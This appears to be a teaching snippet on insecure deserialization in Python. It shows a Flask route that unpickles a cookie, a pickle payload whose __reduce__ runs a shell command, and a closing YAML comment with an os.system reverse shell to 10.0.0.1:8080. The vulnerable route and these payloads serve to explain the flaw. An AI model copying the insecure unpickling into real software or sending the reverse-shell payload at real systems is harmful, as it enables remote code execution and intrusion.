# Definition of a user
class User(object):
    def __init__(self, name):
        self.name = name
 
# The user is serialized along the way using
# something like:
# userdata = base64.encode(cPickle.dumps(user))
# resp.set_cookie('userdata', userdata)
 
# Insecure Flask route
@app.route('/welcome/', methods=['GET'])
def index():
    userdata = request.cookies.get("userdata")
    user = cPickle.loads(base64.decode(userdata))
    return "Greetings, {}".format(user.name)
 
# __reduce__() is called during deserialization
class BadUser(object):
    def __reduce__(self):
        return (self.__class__, (subprocess.check_output(["uname", "-a"]), ))
    def __init__(self, name):
        self.name = name
baduser = BadUser("Max")
bad_cookie = base64.encode(cPickle.dumps(baduser))
 
#Example - PyYaml
 
class Person:
  def __init__(self, name):
    self.name = name
 
new_person = Person("Vickie")
print(yaml.dump(new_person))
 
# This will print:
# !!python/object:__main__.Person {name: Vickie}
# Someone can attack an application by changing 'Vickie' to 'Admin'
# and then loading it using yaml.load(YAML_FILE)
 
# Someone can execute arbitrary code by changing the line to the following example:
# !!python/object/apply:os.system ["bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"]